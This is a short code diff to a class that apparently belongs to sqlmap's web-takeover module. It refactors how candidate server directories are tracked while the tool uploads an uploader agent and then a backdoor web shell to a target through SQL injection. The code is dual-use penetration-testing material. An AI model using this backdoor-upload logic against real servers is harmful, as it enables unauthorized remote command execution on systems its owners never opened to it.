@@ -51,7 +51,7 @@ class Web:
         self.webBaseUrl     = None
         self.webBackdoorUrl = None
         self.webUploaderUrl = None
-        self.webDirectories = set()
+        self.webDirectory   = None
 
     def webBackdoorRunCmd(self, cmd):
         if self.webBackdoorUrl is None:
@@ -114,9 +114,9 @@ class Web:
         self.checkDbmsOs()
 
         kb.docRoot  = getDocRoot()
-        self.webDirectories = getDirs()
-        self.webDirectories = list(self.webDirectories)
-        self.webDirectories.sort()
+        directories = getDirs()
+        directories = list(directories)
+        directories.sort()
 
         infoMsg = "trying to upload the uploader agent"
         logger.info(infoMsg)
@@ -154,7 +154,7 @@ class Web:
         uploaderName = "uploader.%s" % self.webApi
         uploaderStr  = fileToStr(os.path.join(paths.SQLMAP_SHELL_PATH, uploaderName))
 
-        for directory in self.webDirectories:
+        for directory in directories:
             # Upload the uploader agent
             outFile     = os.path.normpath("%s/%s" % (directory, uploaderName))
             uplQuery    = uploaderStr.replace("WRITABLE_DIR", directory)
@@ -184,6 +184,7 @@ class Web:
 
             self.webFileUpload(backdoorPath, backdoorName, directory)
             self.webBackdoorUrl = "%s/%s" % (self.webBaseUrl, backdoorName)
+            self.webDirectory = directory
 
             infoMsg  = "the backdoor has probably been successfully "
             infoMsg += "uploaded on '%s', go with your browser " % directory
